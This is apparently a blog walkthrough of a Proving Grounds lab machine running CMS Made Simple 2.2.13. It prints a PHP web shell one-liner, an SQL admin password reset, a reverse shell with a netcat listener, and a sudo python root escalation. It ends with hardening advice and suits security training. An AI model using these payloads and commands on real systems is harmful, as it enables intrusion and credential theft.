---
author: Greenjam94
categories:
- Walkthroughs
ct_period_last_updated:
- default
date: "2021-06-13T00:59:27Z"
guid: https://www.hackerunder.dev/?p=952
id: 952
title: Proving Grounds My-CMSMS Writeup
url: /proving-grounds-my-cmsms-writeup/
---

**Full disclosure**: I am an Offensive Security employee. This My-CMSMS walkthrough is a summary of what I did and learned. Friends from [\#misec](https://misec.us) and I completed this challenge together. No company restricted resources were used. Creating walkthroughs for Proving Grounds (PG) Play machines is allowed for anyone to publish. However, PG Practice machines from the paid tier, are not permitted to have public walkthroughs posted.

- - - - - -

On June 11th, [@InfosecAli](https://twitter.com/infosecali) and I signed into Proving Grounds and booted up an intermediate PG play machine called My-CMSMS. Ali and I have previously spent time on HackTheBox with the group and since PG provides private machines that other users can not revert, we are moving to the PG platform. Looking at the name of this machine, CMS usually stands for “Content Management System”. I was expecting a website based machine where editing the website only required an admin login to the site, like WordPress. The end goal of this challenge is to get an administrator or root level shell on the operating system of the server.

## Information gathering

With the box booted up, the first thing to do is scan the machine for open ports. `sudo nmap -A TARGET_IP` where TARGET\_IP is pasted from the Proving Grounds portal.

<figure class="wp-block-image size-large">![](https://www.hackerunder.dev/wp-content/uploads/2021/06/mycmsms-nmap-1024x561.png)</figure>I saw 3 initial services running. SSH on port 22, HTTP on port 80, MySQL on port 3306. SSH is usually hard to break into. It is a core linux program used for securely accessing the machine if you had credentials. HTTP is likely the CMS website so that will be my first service to explore. MySQL is the database behind the website, since that is open to the internet it might be worth checking for default credentials.

### Service Enumeration – Website

No fancy tools required to check the website. I visited http://TARGET\_IP in my browser and “CMS made simple” (CMSms) default webpages came up. My initial expectation seemed correct. After some research, CMSms is a content management system and was deployed with default data to the target machine. Scrolling through the first page I noticed two key details. First, a news module was installed. Any additional code, such as 3rd party modules, added to a site creates potential risk of new attacks. Secondly, the version of the software was at the bottom of the page. The version is **2.2.13** and knowing this allows us to look up specific information for that version, such as published vulnerabilities.

<div class="wp-block-image"><figure class="alignleft size-large is-resized">![](https://www.hackerunder.dev/wp-content/uploads/2021/06/mycmsms-web-enum-569x1024.png)</figure></div>After a quick overview, I opened dirbuster to scan the site for hidden file paths and directories. With that running in the background, it’s time to look further into the site. I looked for a login prompt and found one at http://TARGET\_IP/admin. Looking for comments in the source code wasn’t beneficial, I didn’t find anything important.

After searching, the only valuable information I found from the site itself was the following:

- Login page at TARGET\_URL/admin
- Additional news module
- Site version

### Service enumeration – MySQL

With the MySQL database port open to the world, it is worth checking for default credentials. MySQL default user is **root** with no password. The command to access the database is `mysql -h TARGET_IP -u root -p`. Running that without providing a password, I saw a wrong password error returned. It is always worth trying a few common passwords, as this might be a quick way to gain admin access to the site.

While the movie *Hackers* might recommend God, sex, love, and secret as common passwords I prefer to try **admin**, **root**, and **password**. Lab machine creators love to portray system admins as lazy, so repeating the username as the password is a standard thing to check. With `mysql -h TARGET_IP -u root -p` we get access using the password **root**.

<figure class="wp-block-image size-large">![](https://www.hackerunder.dev/wp-content/uploads/2021/06/mycmsms-mysql-1024x416.png)</figure>## Exploitation

We have MySQL access and we have the ability to overwrite any data that supports the website. However, we also need to have a plan before we attack. From our enumeration, we know the version of CMSms which allows us to check for known vulnerabilities. A quick search on [Exploit-DB](https://exploit-db.com) for “CMS made simple 2.2.13” shows Cross Site Scripting (XSS) and authenticated file upload vulnerabilities. XSS will not help us get a shell on the system but uploading a file means we can put our exploit code onto the website and run whatever we like. Since the exploit requires authentication, before we can upload, we need to find a valid website login.

Now we must find a valid user to login with. Since we have direct access to the database, we can get this information easily. Querying the database with `select * from cms_users;` provides us with **admin** as the first username. Googling for “how to reset my CMS made simple password db” the first result sends us to a CMSms [support page](https://cmscanbesimple.org/blog/cms-made-simple-admin-password-recovery) with a universal database query to reset the password of a user. As shown below, we see that the query updates the password field with a new md5 hash of two values added together unless the first value does not exist. Instead of md5(‘mypassword’) it’s more like md5(‘WebsiteStringFromDB’ + ‘mypassword’). This is why if a hacker tried to create a md5 value on their machine and just save it to the website’s database, the login attempt would fail.

```
<pre class="wp-block-code">```
# initial set up
show databases;
use cmsms_db;

# Find user
select * from cms_users;

# update query
update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'hackme'))) where username = 'admin';
# Output: 
# Query OK, 1 row affected (0.042 sec)
# Rows matched: 1  Changed: 1  Warnings: 0
```
```

Now we can go to the target website and login because we know the new website password for admin. I followed a similar update when I transferred my old blog to this domain. [Resetting web app passwords through database access](https://www.hackerunder.dev/replacing-a-forgotten-wordpress-password/) is quite common. Since we have authenticated to the website, we can look at the [arbitrary file upload vulnerability](https://www.exploit-db.com/exploits/48742). The Exploit DB entry explains that PHP code in a .phtml file will execute code. Just simply upload it and visit it from the browser.

To test this we can upload a simple command execution PHP script. Create the script with a short one line command `echo "<?php system($_GET['cmd']);?>" > cmd.phtml` and upload it to the website using the admin “File Manager” module. Now we can get code execution by visiting http://TARGET\_IP/uploads/cmd.phtml?cmd=COMMAND. The server is a linux machine, so commands should be linux commands like whoami, ls, cd, pwd. With command execution, we could open a bind shell or connect back to the attacker machine… but I couldn’t make that work.

<figure class="wp-block-image size-large">![](https://www.hackerunder.dev/wp-content/uploads/2021/06/mycmsms-cmd-exec-1024x195.png)</figure>My alternative was to copy Kali’s /usr/share/webshells/php/php-reverse-shell.php then modify it to include my IP address and intended port. Once I’ve built my reverse shell exploit, I uploaded it to the target website and launched netcat to listen for the reverse shell `sudo nc -nlvp 443`. Visiting http://TARGET\_IP/uploads/shell.phtml we get access to the server as the web service account www-data! This is also a limited sh shell, we can change it to a bash shell with `python -c 'import pty;pty.spawn("/bin/bash")'`.

<figure class="wp-block-image size-large">![](https://www.hackerunder.dev/wp-content/uploads/2021/06/mycmsms-rev-shell-1024x334.png)</figure>Note: The reason I like to use port 443 is because of a coworker’s tip. Even when a firewall is enabled to block ports. Port 80 and 443 are open for HTTP and HTTPS traffic.

## Privilege Escalation

Now that we are on the server, the next step is more enumeration to find better access to the server. www-data is a service account that only has permission to run the website. We can not modify system settings or change other user’s information. While sharing on Discord, I did my enumeration poorly. I went straight to the /home directory and started looking for custom files. I saw one executable script owned by root and assumed it was a file to run commands as root.. This wasted a large amount of time before we realized it wasn’t what I thought it was. It looked related to setuid, but apparently [bash and linux protects against scripts elevating privileges](https://unix.stackexchange.com/questions/366365/suid-script-not-working-correctly). This was a rabbit hole that I fell into, proper enumeration and taking my time would have given me a better understanding of the intended attack path.

So let’s slow down and enumerate as we should. Using our low level access, we can find out about the system. There are many websites that walk you through what to check. [G0tm1lk’s blog post](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) is always a good choice. This time I googled and landed at <https://guif.re/linuxeop>. After some more enumerating, and focusing on /var/www/html because we are the www-data user. Not only did I find the user flag to submit for Proving Grounds, but I also saw .htaccess and .htpasswd.

<figure class="wp-block-image size-large">![](https://www.hackerunder.dev/wp-content/uploads/2021/06/mycmsms-htpasswd-1024x673.png)</figure>Reading the .htpasswd file, we see a password value that looks base64 encoded. I say that because base64 strings usually end with one or two equal signs (=). There are many ways to decode a string, but a quick and dirty method is to use [cyberchef and the magic operation](https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,'')&input=VFVaYVJ6SXpNMVpQU1RWR1J6SkVTazFXVjBkSlVVSlNSMGxhVVQwOVBUMD0) to guess the functions used to hash or encode the string. I say dirty because this uploads a value to someone’s site where it could be stored, analyzed, and possibly sold. If this was a client and not a lab machine, I’d be responsible for mishandling a client’s password! In CyberChef we see the original string is `Armour:Shield@123` which looks like our linux user and a password.

<figure class="wp-block-image size-large">![](https://www.hackerunder.dev/wp-content/uploads/2021/06/mycmsms-cyberChef-1024x499.png)</figure>### Getting user and root access on My-CMSMS

The credentials we found from .htpasswd might be useful for other logins. We know SSH is open from our initial nmap scan, so I tried that first: `ssh armour@TARGET_IP`. The login failed because it only accepts authorized keys instead of passwords. However using the reverse shell as www-data only requires a simple “switch user” `su` command to become Armour. Thankfully this user relied on password reuse.

<figure class="wp-block-image size-large">![](https://www.hackerunder.dev/wp-content/uploads/2021/06/mycmsms-user-shell.png)</figure>Now that we are a user, we need to do more enumeration to see what this user has access to do that www-data can’t. Continuing from guif.re, I checked for sudo permissions with `sudo -l` and saw this the output below. Using the sudo command, the Armour user will run python as root. We already know from changing our www-data shell from sh to bash that we can create new shells with python.

```
<pre class="wp-block-code">```
Matching Defaults entries for armour on mycmsms:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User armour may run the following commands on mycmsms:
    <strong>(root) NOPASSWD: /usr/bin/python</strong>
```
```

<figure class="wp-block-image size-large">![](https://www.hackerunder.dev/wp-content/uploads/2021/06/mycmsms-priv-esc.png)</figure>## My-CMSMS Summary

Turns out we can become root by running a python spawned TTY shell using sudo. Once we are root the challenge is over! This My-CMSMS exercise was fun. It took Ali and I just under two hours to complete. Writing this summary doesn’t show the amount of times we grumbled about being rusty and forgetting the basics, it’s been a few weeks since we last worked together on an exercise like this. If you would like to join us for future attempts, [click here for the #misec discord](https://discord.gg/Hk3D4W8yEj).

From this machine, there are a few takeaways to better secure a CMS system like this one.

1. Don’t use default passwords or reuse them. Mysql’s root:root, Armour’s htpasswd and system password
2. Don’t run mysql open to the internet. It is possible to have it using an internal loopback so only that server can reach the database and the port isn’t open to the world
3. Keep websites up to date as new versions are released
4. Don’t let users run an entire code interpreter as root, Python or any other coding language is too powerful and this lets the user do malicious things